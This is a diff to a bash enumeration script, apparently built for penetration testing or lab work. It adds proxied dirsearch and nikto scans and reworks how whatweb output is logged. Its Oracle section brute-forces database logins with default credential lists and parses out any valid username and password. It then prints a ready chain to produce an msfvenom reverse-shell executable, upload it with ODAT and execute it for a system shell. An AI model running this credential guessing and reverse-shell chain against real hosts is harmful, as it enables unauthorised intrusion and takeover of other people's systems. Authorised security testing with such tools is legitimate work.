@@ -21,7 +21,7 @@ YELLOW='\e[93m'
 END='\e[0m'
 
 helpFunction() {
-    echo -e "${DOPE} Usage: $0 [options...] <Target IP>"
+    echo -e "${DOPE} Usage: $0 [options...] <Target-IP>"
     echo " "
     echo " -h, --help         Show Usage and command arguments"
     echo " "
@@ -129,10 +129,13 @@ Enum_Web() {
             echo -e "${DOPE} Running The Following Commands"
             # echo -e "${DOPE} gobuster dir -u http://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt -e -k | tee gobuster-$rhost-$port.txt"
             # echo -e "${DOPE} uniscan -u http://$rhost:$port/ -qweds"
-            echo -e "${DOPE} whatweb -v -a 3 --color=never http://$rhost:$port/ | tee whatweb-$rhost:$port.log"
-            whatweb -v -a 3 --color=never http://$rhost:$port | tee whatweb-$rhost-$port.log
+            echo -e "${DOPE} whatweb -v -a 3 http://$rhost:$port | tee whatweb-color-$rhost-$port.log"
+            whatweb -v -a 3 http://$rhost:$port | tee whatweb-color-$rhost-$port.log
+            # Removing color from output log
+            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$rhost-$port.log >whatweb-$rhost-$port.log && rm whatweb-color-$rhost-$port.log
             echo -e "${DOPE} Checking for Web Application Firewall... wafw00f http://$rhost:$port/"
             wafw00f http://$rhost:$port/ | tee wafw00f-color-$rhost-$port.log
+            # Removing color from output log
             sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" wafw00f-color-$rhost-$port.log >wafw00f-$rhost-$port.log
             rm wafw00f-color-$rhost-$port.log
             echo -e "${DOPE} curl -sSik http://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null"
@@ -238,10 +241,24 @@ Web_Proxy_Scan() {
     grep -v "ssl" top-open-services.txt | grep -E "http-proxy|Squid" | cut -d "/" -f 1 >openports-webproxies-$rhost.txt
     portfilename3=openports-webproxies-$rhost.txt
     httpPortsLines3=$(cat $portfilename3)
-    for port in $httpPortsLines3; do
+    for proxyPort in $httpPortsLines3; do
         if [[ -s openports-webproxies-$rhost.txt ]]; then
-            echo -e "${DOPE} Found http-proxy at http://$rhost:$port"
-            nikto -h http://127.0.0.1/ -useproxy http://$rhost:$port/
+
+            echo -e "${DOPE} Found http-proxy at http://$rhost:$proxyPort"
+            portfilename4=httpports-$rhost.txt
+            httpPortsLines4=$(cat $portfilename4)
+            if [[ -s httpports-$rhost.txt ]]; then
+                for webPort in $httpPortsLines4; do
+                    python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt,json,cnf,bak,js -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ --plain-text-report proxy-crawl-$rhost-$webPort-$proxyPort.log
+                    echo -e "${DOPE} Found http-proxy at http://$rhost:$proxyPort"
+                    echo -e "${DOPE} nikto -h http://127.0.0.1:$webPort/ -useproxy http://$rhost:$proxyPort/ -output nikto-$proxyPort-scan.txt"
+                    nikto -h http://127.0.0.1:$webPort/ -useproxy http://$rhost:$proxyPort/ -output nikto-$proxyPort-scan.txt
+                done
+            else
+                python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt,json,cnf,bak,js -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1/ --plain-text-report proxy-crawl-$rhost-$webPort-$proxyPort.log
+                echo -e "${DOPE} nikto -h http://127.0.0.1/ -useproxy http://$rhost:$proxyPort/ -output nikto-$proxyPort-scan.txt"
+                nikto -h http://127.0.0.1/ -useproxy http://$rhost:$proxyPort/ -output nikto-$proxyPort-scan.txt
+            fi
         fi
     done
     rm openports-webproxies-$rhost.txt
@@ -358,8 +375,10 @@ Enum_Web_SSL() {
             sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" sslscan-color-$rhost-$port.log >sslscan-$rhost-$port.log
             rm sslscan-color-$rhost-$port.log
             dns_enum
-            echo -e "${DOPE} whatweb -v -a 3 --color=never https://$rhost:$port/ | tee whatweb-$rhost-$port.log"
-            whatweb -v -a 3 --color=never https://$rhost:$port | tee whatweb-ssl-$rhost-$port.log
+            echo -e "${DOPE} whatweb -v -a 3 https://$rhost:$port | tee whatweb-color-$rhost-$port.log"
+            whatweb -v -a 3 https://$rhost:$port | tee whatweb-color-$rhost-$port.log
+            # Removing color from output log
+            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$rhost-$port.log >whatweb-ssl-$rhost-$port.log && rm whatweb-color-$rhost-$port.log
             echo -e "${DOPE} Checking for Web Application Firewall... wafw00f https://$rhost:$port/"
             wafw00f https://$rhost:$port/ | tee wafw00f-color-$rhost-$port.log
             sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" wafw00f-color-$rhost-$port.log >wafw00f-$rhost-$port.log
@@ -590,7 +609,8 @@ Enum_SNMP() {
 
 FULL_TCP_GOOD_MEASUERE_VULN_SCAN() {
     cwd=$(pwd)
-    echo -e "${DOPE} Running Full Nmap TCP port Scan ${DOPE} nmap -vv -Pn -sC -sV -p- -T4 -oA nmap/full-tcp-scan-$rhost $rhost"
+    echo -e "${DOPE} Running Full Nmap TCP port Scan"
+    echo -e "${DOPE} nmap -vv -Pn -sC -sV -p- -T4 -oA nmap/full-tcp-scan-$rhost $rhost"
     nmap -vv -Pn -sC -sV -p- -T4 -oA nmap/full-tcp-scan-$rhost $rhost
     echo -e "${YELLOW}#################################################################################################### ${END}"
     echo -e "${TEAL}########################### Checking Vulnerabilities  ############################################## ${END}"
@@ -730,23 +750,45 @@ Enum_Oracle() {
         ./odat.py tnscmd -s $rhost -p 1521 --status | tee $reconDir2/oracle-status.txt
         echo -e "${DOPE} ./odat.py sidguesser -s $rhost -p 1521 | tee $reconDir2/oracle-sid.txt"
         ./odat.py sidguesser -s $rhost -p 1521 | tee $reconDir2/oracle-sid.txt
-        SIDS=$(cat $reconDir2/oracle-sid.txt | grep "server:" | rev | cut -d " " -f 1 | rev)
-        sid_array=$(echo $SIDS | tr "," "\n")
+        SIDS=$(sed -n -e 's/^.*server: //p' $reconDir2/oracle-sid.txt)
+        sid_list=$(echo $SIDS | tr "," "\n")
         cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt $reconDir2/oracle_default_userpass.txt
         cp /opt/odat/accounts/accounts_multiple.txt $reconDir2/accounts_multiple.txt
         sed 's/ /\//g' $reconDir2/oracle_default_userpass.txt -i
         sed -e 's/\(.*\)/\L\1/' $reconDir2/accounts_multiple.txt >$reconDir2/accounts_multiple_lowercase.txt
         rm $reconDir2/accounts_multiple.txt
         if [[ -n $SIDS ]]; then
-            for sid in $sid_array; do
+            for sid in $sid_list; do
                 echo -e "${DOPE} Running ODAT passwordguesser ${DOPE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt"
                 ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt
                 if grep -i "Valid credentials found" $reconDir2/oracle-$sid-password-guesser.txt 2>/dev/null; then
                     echo -e "${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} Found Valid Credentials! ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE}"
+                    cp $reconDir2/oracle-$sid-password-guesser.txt $reconDir2/Found-Oracle-$sid-Credentials.txt
+                    grep -v "Time" $reconDir2/Found-Oracle-$sid-Credentials.txt >$reconDir2/oracle-Found-Credentials.txt
+                    rm $reconDir2/Found-Oracle-$sid-Credentials.txt
+                    grep -A 1 "Accounts found" $reconDir2/oracle-Found-Credentials.txt | tail -n 1 >oracle-user-pass.txt
+                    username=$(cat oracle-user-pass.txt | cut -d "/" -f 1)
+                    password=$(cat oracle-user-pass.txt | cut -d "/" -f 2)
+                    echo -e "${DOPE} You can now get a system shell using MSFVENOM & ODAT!"
+                    echo -e "${DOPE} Run the following commands"
+                    echo -e "${DOPE} msfvenom -p windows/x64/shell/reverse_tcp LHOST=YOUR-IP LPORT=443 -f exe -o reverse443.exe"
+                    echo -e "${DOPE} Start up a metasploit multi handler listener"
+                    echo -e "${DOPE} ./odat.py utlfile -s $rhost --sysdba -d $sid -U $username -P $password --putFile /temp Shell.exe reverse443.exe"
+                    echo -e "${DOPE} ./odat.py externaltable -s $rhost -U $username -P $password -d $sid --sysdba --exec /temp Shell.exe"
                     :
                 else
                     echo -e "${DOPE} Running ODAT passwordguesser ${DOPE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt"
                     ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt
+                fi
+                grep -v "Time" $reconDir2/oracle-sid.txt >$reconDir2/oracle-SID.txt
+                rm $reconDir2/oracle-sid.txt
+                if [[ -s $reconDir2/oracle-$sid-2-password-guesser.txt ]]; then
+                    grep -v "Time" $reconDir2/oracle-$sid-2-password-guesser.txt >$reconDir2/oracle-$sid-1-password-guesser.txt
+                    rm $reconDir2/oracle-$sid-2-password-guesser.txt
+                fi
+                if [[ -s $reconDir2/oracle-$sid-password-guesser.txt ]]; then
+                    grep -v "Time" $reconDir2/oracle-$sid-password-guesser.txt >$reconDir2/oracle-$sid-password-guesser3.txt
+                    rm $reconDir2/oracle-$sid-password-guesser.txt
                 fi
             done
         fi
